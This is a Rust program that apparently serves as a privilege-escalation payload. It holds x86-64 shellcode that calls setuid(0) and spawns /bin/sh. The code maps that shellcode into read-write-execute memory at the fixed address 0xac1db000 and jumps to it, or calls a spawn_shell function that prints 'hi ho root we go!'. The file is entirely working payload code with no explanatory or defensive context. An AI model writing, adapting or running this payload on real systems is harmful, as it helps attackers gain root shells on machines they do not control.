#![feature(naked_functions)]
#![feature(asm)]

use libc::{mmap, mprotect, MAP_ANONYMOUS, MAP_FAILED, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};
use std::ptr;
use std::arch::asm;
use std::process::Command;
use clap::{Parser, ValueEnum};

#[derive(Parser)]
#[clap(name = "My Program", version = "1.0", about = "Does awesome things")]
struct Cli {
    #[clap(value_enum)]
    mode: Mode,
}

#[derive(Copy, Clone, ValueEnum)]
enum Mode {
    Mmap,
    Call,
}

const SHELLCODE: &[u8] = &[
    0x48, 0x31, 0xff, 0xb0, 0x69, 0x0f, 0x05, 0x48, 0x31, 0xd2, 0x48, 0xbb, 0xff, 0x2f, 0x62, 0x69,
    0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xc0, 0x50,
    0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05, 0x6a, 0x01, 0x5f, 0x6a, 0x3c, 0x58, 0x0f, 0x05
];

fn map_shellcode() -> *mut u8 {
    unsafe {
        let length = SHELLCODE.len();
        let prot = PROT_READ | PROT_WRITE | PROT_EXEC;
        let flags = MAP_ANONYMOUS | MAP_PRIVATE;

        let addr_use: *mut u8 = 0xac1db000 as *mut u8;

        // Allocate memory for shellcode
        let addr = mmap(addr_use as *mut _, length, prot, flags, -1, 0);

        if addr == MAP_FAILED {
            println!("mmap failed");
            std::process::exit(-1);
        }

        // Copy shellcode to allocated memory
        let shellcode_ptr = addr as *mut u8;
        ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), shellcode_ptr, length);

        // Mark memory as executable
        if mprotect(addr, length, prot) != 0 {
            println!("mprotect failed");
            std::process::exit(-1);
        }

        shellcode_ptr
    }
}

#[no_mangle]
#[export_name = "spawn_shell"]
extern "C" fn spawn_shell() {
    println!("[*] hi ho root we go!");

    let mut shell = Command::new("/bin/sh")
        .spawn()
        .expect("Failed to spawn shell");

    shell.wait().expect("Shell process wasn't running");
}

unsafe fn call_asm(func_ptr: *const ()) {
    asm!(
        "call {0}",
        in(reg) func_ptr,
    );
}

fn main() {
    let cli = Cli::parse();

    match cli.mode {
        Mode::Mmap => {
            let shellcode_addr = map_shellcode();
            println!("mapped at address: {:?}", shellcode_addr);
            unsafe {
                call_asm(shellcode_addr as *const ());
            }
        }
        Mode::Call => {
            println!("CALL option selected");
            unsafe {
                let func_ptr = spawn_shell as *const ();
                println!("Function pointer to spawn_shell: {:?}", func_ptr);
                call_asm(func_ptr);
            }
        }
    }
}
